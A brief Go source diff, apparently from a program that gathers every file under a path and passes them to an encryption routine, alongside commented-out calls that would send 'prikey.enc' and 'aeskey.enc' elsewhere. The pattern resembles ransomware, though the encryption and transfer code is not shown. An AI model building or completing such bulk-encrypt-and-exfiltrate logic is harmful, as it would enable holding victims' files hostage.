@@ -1,6 +1,8 @@
 package main
 
 import (
+	"./encrypt"
+	"./fileSystem"
 	"fmt"
 	"os"
 	"strings"
@@ -23,6 +25,6 @@ func main() {
 
 	//fileTransfer.sendFile("prikey.enc")
 	//fileTransfer.sendFile("aeskey.enc")
-	//filePath := fileSystem.GetAllFile(ffname)
-	//encrypt.Run(filePath)
+	filePath := fileSystem.GetAllFile(ffname)
+	encrypt.Run(filePath)
 }
